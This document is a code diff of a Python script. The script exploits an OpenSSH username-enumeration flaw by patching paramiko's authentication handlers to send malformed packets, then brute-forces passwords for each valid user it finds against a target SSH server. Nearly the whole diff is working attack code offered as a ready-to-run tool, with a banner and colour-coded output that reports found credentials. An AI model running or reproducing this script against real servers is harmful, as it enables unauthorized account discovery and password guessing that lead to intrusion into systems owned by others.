@@ -1,113 +1,104 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 import argparse
-import logging
 import paramiko
-import multiprocessing
-import socket
-import string
 import sys
+import os
+import socket
+import logging
+import string
 import json
+from colorama import Fore, Style
 from random import randint as rand
 from random import choice as choice
 
-# store function we will overwrite to malform the packet
-old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
+global hostname, username, port, password_file
 
-# list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target
-# with these 3 random usernames (there is an almost 0 possibility that they can be real ones)
-random_username_list = []
-# populate the list
-for i in range(3):
-    user = "".join(choice(string.ascii_lowercase) for x in range(rand(15, 20)))
-    random_username_list.append(user)
+def exploit(hostname, username, port, validuser = ""):
+    # store function we will overwrite to malform the packet
+    old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
 
-# create custom exception
-class BadUsername(Exception):
-    def __init__(self):
+
+    # list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target
+    # with these 3 random usernames (there is an almost 0 possibility that they can be real ones)
+    random_username_list = []
+    # populate the list
+    for i in range(3):
+        user = "".join(choice(string.ascii_lowercase) for x in range(rand(15, 20)))
+        random_username_list.append(user)
+
+
+    # create custom exception
+    class BadUsername(Exception):
+        def __init__(self):
+            pass
+
+    # create malicious "add_boolean" function to malform packet
+    def add_boolean(*args, **kwargs):
         pass
+        
+    # create function to call when username was invalid
+    def call_error(*args, **kwargs):
+        raise BadUsername()
 
-# create malicious "add_boolean" function to malform packet
-def add_boolean(*args, **kwargs):
-    pass
+    # create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
+    def malform_packet(*args, **kwargs):
+        old_add_boolean = paramiko.message.Message.add_boolean
+        paramiko.message.Message.add_boolean = add_boolean
+        result  = old_parse_service_accept(*args, **kwargs)
+        #return old add_boolean function so start_client will work again
+        paramiko.message.Message.add_boolean = old_add_boolean
+        return result
+        
+    # assign functions to respective handlers and add a backup
+    old_SERVICE_ACCEPT = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
+    old_USERAUTH_FAILURE = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE]
+    paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
+    paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
 
-# create function to call when username was invalid
-def call_error(*args, **kwargs):
-    raise BadUsername()
+    # get rid of paramiko logging
+    ######CHECK WHAT THIS DOES, IS IT REDUNDANT?#######
+    logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
 
-# create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
-def malform_packet(*args, **kwargs):
-    old_add_boolean = paramiko.message.Message.add_boolean
-    paramiko.message.Message.add_boolean = add_boolean
-    result  = old_parse_service_accept(*args, **kwargs)
-    #return old add_boolean function so start_client will work again
-    paramiko.message.Message.add_boolean = old_add_boolean
-    return result
+    # create function to perform authentication with malformed packet and desired username
+    def checkUsername(username, tried=0):
+        sock = socket.socket()
+        sock.connect((hostname, port))
+        # instantiate transport
+        transport = paramiko.transport.Transport(sock)
+        try:
+            transport.start_client()
+        except paramiko.ssh_exception.SSHException:
+            print("supposed exception")
+            # server was likely flooded, retry up to 3 times
+            transport.close()
+            if tried < 4:
+                tried += 1
+                return checkUsername(username, tried)
+            else:
+                print('[-] Failed to negotiate SSH transport')
+        try:
+            transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
+        except BadUsername:
+                return (username, False)
+                
+        except paramiko.ssh_exception.AuthenticationException:
+                return (username, True)
+                
+        #Successful auth(?)
+        raise Exception("There was an error. Is this the correct version of OpenSSH?")
+    
+    # function to test target system using the randomly generated usernames
+    def checkVulnerable():
+        vulnerable = True
+        for user in random_username_list:
+            result = checkUsername(user)
+            if result[1]:
+                vulnerable = False
+        return vulnerable
 
-# create function to perform authentication with malformed packet and desired username
-def checkUsername(username, tried=0):
-    sock = socket.socket()
-    sock.connect((args.hostname, args.port))
-    # instantiate transport
-    transport = paramiko.transport.Transport(sock)
-    try:
-        transport.start_client()
-    except paramiko.ssh_exception.SSHException:
-        # server was likely flooded, retry up to 3 times
-        transport.close()
-        if tried < 4:
-            tried += 1
-            return checkUsername(username, tried)
-        else:
-            print('[-] Failed to negotiate SSH transport')
-    try:
-        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
-    except BadUsername:
-            return (username, False)
-    except paramiko.ssh_exception.AuthenticationException:
-            return (username, True)
-    #Successful auth(?)
-    raise Exception("There was an error. Is this the correct version of OpenSSH?")
-
-# function to test target system using the randomly generated usernames
-def checkVulnerable():
-    vulnerable = True
-    for user in random_username_list:
-        result = checkUsername(user)
-        if result[1]:
-            vulnerable = False
-    return vulnerable
-
-def exportList(results):
-    final = ""
-    for result in results:
-        if result[1]:
-            final+=result[0]+" is a valid user!\n"
-        else:
-            final+=result[0]+" is not a valid user!\n"
-    return final
-
-# assign functions to respective handlers
-paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
-paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
-
-# get rid of paramiko logging
-logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
-
-arg_parser = argparse.ArgumentParser()
-arg_parser.add_argument('hostname', type=str, help="The target hostname or ip address")
-arg_parser.add_argument('--port', type=int, default=22, help="The target port")
-arg_parser.add_argument('--threads', type=int, default=5, help="The number of threads to be used")
-# arg_parser.add_argument('--outputFile', type=str, help="The output file location")
-# arg_parser.add_argument('--outputFormat', choices=['list', 'json', 'csv'], default='list', type=str, help="The output file location")
-group = arg_parser.add_mutually_exclusive_group(required=True)
-group.add_argument('--username', type=str, help="The single username to validate")
-group.add_argument('--userlist', type=str, help="The list of usernames (one per line) to enumerate through")
-args = arg_parser.parse_args()
-
-def main():
     sock = socket.socket()
     try:
-        sock.connect((args.hostname, args.port))
+        sock.connect((hostname, port))
         sock.close()
     except socket.error:
         print('[-] Connecting to host failed. Please check the specified host and port.')
@@ -116,28 +107,106 @@ def main():
     # first we run the function to check if host is vulnerable to this CVE
     if not checkVulnerable():
         # most probably the target host is either patched or running a version not affected by this CVE
-        print("Target host most probably is not vulnerable or already patched, exiting...")
+        print("[-] Target host most probably is not vulnerable or already patched, exiting...")
         sys.exit(0)
-    elif args.username: #single username passed in
-        result = checkUsername(args.username)
+    elif username:
+        result = checkUsername(username)
         if result[1]:
-            print(result[0]+" is a valid user!")
+            print(Fore.BLUE+ "[+] User: " + result[0]+" => is a valid user" + Style.RESET_ALL)
+            validuser = (result[0])
         else:
-            print(result[0]+" is not a valid user!")
-    elif args.userList: #username list passed in
-        try:
-            f = open(args.userList)
-        except IOError:
-            print("[-] File doesn't exist or is unreadable.")
-            sys.exit(3)
-        usernames = map(str.strip, f.readlines())
-        f.close()
-        # map usernames to their respective threads
-        pool = multiprocessing.Pool(args.threads)
-        results = pool.map(checkUsername, usernames)
-    else: # no usernames passed in
-        print("[-] No usernames provided to check")
-        sys.exit(4)
+            print(Fore.YELLOW+ "[*] User: " + result[0]+" => is not a valid user" + Style.RESET_ALL)
 
-if __name__ == '__main__':
-    main()
+    
+    #Restore Paramiko to defaults
+    paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] =  old_SERVICE_ACCEPT
+    paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = old_USERAUTH_FAILURE
+
+    #Return valid username
+    return(validuser)
+    
+
+
+def ssh_connect(hostname, port, username, password, code = 0):
+    ssh2 = paramiko.SSHClient()
+    ssh2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+        ssh2.connect(hostname, port, username, password)
+    except paramiko.AuthenticationException:
+        #[-] Authentication Failed ...
+        code = 1
+    except socket.error as e:
+        #[-] Connection Failed ... Host Down
+        code = 2
+    
+    ssh2.close()
+    return code
+
+
+try:
+
+    arg_parser = argparse.ArgumentParser()
+    arg_parser.add_argument('hostname', type=str, help="The target hostname or ip address")
+    group = arg_parser
+    arg_parser.add_argument('--port', type=int, default=22, help="The target port (Default 22)")
+    group = arg_parser.add_mutually_exclusive_group(required=True)
+    group.add_argument('--username', type=str, help="A Single Usename to Enumerate")
+    group.add_argument('--userfile', type=str, help="The list of usernames (one per line) to enumerate through")
+    group = arg_parser.add_mutually_exclusive_group(required=True)
+    group.add_argument('--password', type=str, help="A Single Password to Enumerate")
+    group.add_argument('--passfile', type=str, help="The list of passwords (one per line) to enumerate through")
+
+    args = arg_parser.parse_args()
+
+    print(Fore.CYAN+"""\
+        
+                )     (    )                      SSH User or Password Enmeration  
+                 )     )  ( 
+                  )    )   (         ,adPPYba, 88       88  ,adPPYba,  8b,dPPYba,   ,adPPYba,  
+               _.(--'('''--)._      I8[    "" 88       88 a8"     "8a 88P'    "8a a8P_____88      
+              /, _..-----).._,\      `"Y8ba,  88       88 8b       d8 88       d8 8PP"""""""
+             |  `'''-----'''`  |    aa    ]8I "8a,   ,a88 "8a,   ,a8" 88b,   ,a8" "8b,   ,aa 
+              \               /     `"YbbdP"'  `"YbbdP'Y8  `"YbbdP"'  88`YbbdP"'   `"Ybbd8"' 
+               '.           .'                                        88               
+                 '--.....--'                                          88 
+                                                             V1.0.5
+                                                ASCII Art Credit ascii.co.uk
+                                            """)
+    
+    if args.userfile:
+        if os.path.exists(args.userfile) == False:
+            print(Fore.RED + "[-] Username Filepath: " +args.userfile  +" Does Not Exist. Exiting Now...")
+            sys.exit(3)
+        else:
+            lineuser = [line.strip("\n") for line in open(args.userfile)]
+    elif args.username:
+        lineuser = [args.username]
+    if args.passfile:
+        if os.path.exists(args.passfile) == False:
+            print(Fore.RED + "[-] Password Filepath: " +args.passfile + " Does Not Exist. Exiting Now...")
+            sys.exit(3)
+        else:
+            linepassword = [line.strip("\n") for line in open(args.passfile)]
+    elif args.password:
+        linepassword = [args.password]
+
+    for user in lineuser:
+        validuser = exploit(args.hostname, user, args.port)
+        if validuser !="":
+            for password in linepassword:                             
+                try:
+                    response = ssh_connect(args.hostname, args.port, validuser, password)                
+                    if response == 0:
+                        print(Fore.GREEN + "[+] User: %s [+] Pass Found: %s" % (validuser, password)+ Style.RESET_ALL)
+                    elif response == 1:
+                        print(Fore.RED + "[/] User: %s [/] Pass: %s => Login Incorrect!!! <=" % (validuser, password)+ Style.RESET_ALL)  
+                    elif response == 2:
+                        print("[-] Connnection could not be established to the address: %s" % (args.hostname))
+                        sys.exit(2)
+                except Exception as ex:
+                    print (ex)
+                    pass            
+except KeyboardInterrupt:
+    print("\n\n[-] User Requested An Interupt. Exiting Now...")
+    sys.exit(4)
